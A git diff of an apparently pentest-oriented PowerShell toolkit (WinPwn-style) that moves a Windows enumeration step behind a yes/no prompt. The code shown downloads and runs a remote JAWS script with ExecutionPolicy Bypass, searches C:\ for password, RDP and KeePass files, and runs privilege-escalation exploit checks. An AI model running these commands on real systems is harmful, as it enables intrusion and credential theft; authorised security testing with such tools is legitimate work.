@@ -7,6 +7,7 @@ function Unzip
     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
 }
 
+
 function dependencychecks
 {
     <#
@@ -268,6 +269,27 @@ function localreconmodules
                 Find-InterestingFile -Path 'C:\' -Outfile "$currentPath\LocalRecon\InterestingFiles.txt"
                 Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup -Outfile "$currentPath\LocalRecon\MoreFiles.txt"
             }
+
+            $search = Read-Host -Prompt 'Start Just Another Windows (Enum) Script? (yes/no)'
+            if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
+            {
+                jaws
+            }
+}
+
+function jaws
+{
+<#
+        .DESCRIPTION
+        Just another Windows Enumeration Script.
+        Author: @411Hall
+        License: BSD 3-Clause
+    #>
+            #Local Recon / Privesc
+            Write-Host -ForegroundColor Yellow 'Executing Just Another Windows (Enum) Script:'
+            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1' -Outfile $currentPath\LocalPrivesc\JAWS.ps1
+            Invoke-expression 'cmd /c start powershell -Command {powershell.exe -ExecutionPolicy Bypass -File .\LocalPrivesc\JAWS.ps1 -OutputFilename JAWS-Enum.txt}'
+
 }
 
 function domainreconmodules
@@ -358,9 +380,11 @@ function privescmodules
     Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
     Find-AllVulns >> $currentPath\LocalPrivesc\Sherlock_Vulns.txt
 
-    Write-Host -ForegroundColor Yellow 'Executing Just Another Windows (Enum) Script:'
-    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1' -Outfile $currentPath\LocalPrivesc\JAWS.ps1
-    invoke-expression 'cmd /c start powershell -Command {powershell.exe -ExecutionPolicy Bypass -File .\LocalPrivesc\JAWS.ps1 -OutputFilename JAWS-Enum.txt}'
+    $search = Read-Host -Prompt 'Start Just Another Windows (Enum) Script? (yes/no)'
+    if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
+    {
+        jaws
+    }
 }
 
 function lazagnemodule
@@ -592,6 +616,7 @@ function WinPwn
     $forensicMode = Read-Host -Prompt 'Do you want to use forensic- or pentest-Mode? (forensic/pentest)'
     if ($forensicMode -eq "forensic" -or $forensicMode -eq "f" -or $forensicMode -eq "for")
     {
+        dependencychecks
         if (isadmin)
         {
             Write-Host -ForegroundColor Green "Elevated PowerShell session detected. Continuing."
